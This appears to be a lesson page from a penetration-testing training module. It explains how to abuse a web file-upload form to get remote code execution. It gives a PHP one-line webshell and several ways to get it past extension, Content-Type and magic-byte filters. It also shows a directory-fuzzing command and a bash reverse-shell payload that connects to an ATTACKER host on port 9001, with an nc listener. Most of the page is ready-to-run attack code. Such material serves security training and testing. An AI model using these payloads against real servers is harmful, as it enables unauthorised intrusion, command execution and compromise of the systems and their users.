---
title: File upload to a shell
slug: file-upload-to-shell
area: web
module: 21
order: 4
goal: Abuse a file-upload feature to drop a webshell and get command execution.
summary: How to turn a file upload into RCE — get a webshell past extension, content-type and magic-byte filters, find where it landed, and trigger a reverse shell.
prereqs: [An upload form (profile picture, document, attachment…), Knowing the server language (PHP/ASPX/JSP), A listener for the reverse shell]
seeAlso: [tool:web-attacks, tool:web-proxies, tool:reverse-shells, howto:file-inclusion, howto:sqli-to-shell]
references:
  - PayloadsAllTheThings: upload insecure files | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  - HackTricks: file upload | https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html
---

If you can upload a file the server will execute, you have code execution. The whole game is getting a script past the upload filters and finding the URL it was saved to.

## The basic webshell

```php
<?php system($_GET['cmd']); ?>
```

Upload it as `shell.php`, then browse to it: `http://TARGET/uploads/shell.php?cmd=id`.

## Beat the filters

```text
Extension:   shell.php5 / .phtml / .phar / .pht      (alt PHP extensions)
             shell.php.jpg / shell.jpg.php           (double extension)
Content-Type: change to image/png in the proxy
Magic bytes:  prepend GIF89a; to the file so it "is" a GIF
Case:        shell.PhP
Null byte:    shell.php%00.jpg   (older stacks)
```

Upload through a proxy so you can edit the request (filename, Content-Type, body) on the fly.

## Find where it landed

```bash
feroxbuster -u http://TARGET/uploads -w common.txt -x php    # locate the upload dir
```

Check the response/redirect after upload — it often reveals the stored path or filename.

## Get a reverse shell

```bash
nc -lvnp 9001                                         # listener
# then browse to:  shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/ATTACKER/9001 0>%261'
```

## If it fails

- **"Invalid file type"**: the filter is client-side or Content-Type only — bypass in the proxy; if it checks magic bytes, prepend `GIF89a;`.
- **Uploaded but won't execute**: wrong extension for the stack, or the upload dir has execution disabled — try `.phtml`/`.phar`, or pair with an LFI to include the file (see File inclusion).
- **Can't find the file**: fuzz the uploads directory, or read the stored path from the response/DB.
- **WAF strips `<?php`**: try `<?=` short tags, or `.phar`/polyglot tricks.

## Verify

`...uploads/shell.php?cmd=id` returning command output confirms RCE. Upgrade the reverse shell to a stable TTY, then enumerate for privesc.
